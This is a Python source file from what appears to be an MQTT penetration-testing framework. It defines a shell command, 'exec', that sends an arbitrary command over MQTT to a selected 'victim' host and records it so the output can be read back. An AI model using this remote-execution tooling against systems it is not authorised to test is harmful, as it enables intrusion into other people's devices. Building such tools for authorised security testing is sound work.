from cmd2 import with_argparser, with_category
import argparse

from mqtt_pwn.models.command import Command
from mqtt_pwn.shell.base import BaseMixin
from mqtt_pwn.utils import victim_required, connection_required


class ExecuteMixin(BaseMixin):
    """Execute Mixin Class"""

    execute_parser = argparse.ArgumentParser()
    execute_parser.add_argument('command', help='the command to execute on the current victim', nargs=argparse.REMAINDER)

    @with_category(BaseMixin.CMD_CAT_VICTIM_OP)
    @with_argparser(execute_parser)
    def do_exec(self, args):
        """The Execute function method"""

        self._execute_command(' '.join(args.command))

    @connection_required
    @victim_required
    def _execute_command(self, command):
        """Executed a command on the selected victim"""

        c = Command.create(
            victim=self.current_victim,
            command=command
        )

        self.mqtt_client.send_command(self.current_victim, c)
        self.print_info(f'Executed command (id #{c.id}), look at the output table for results.')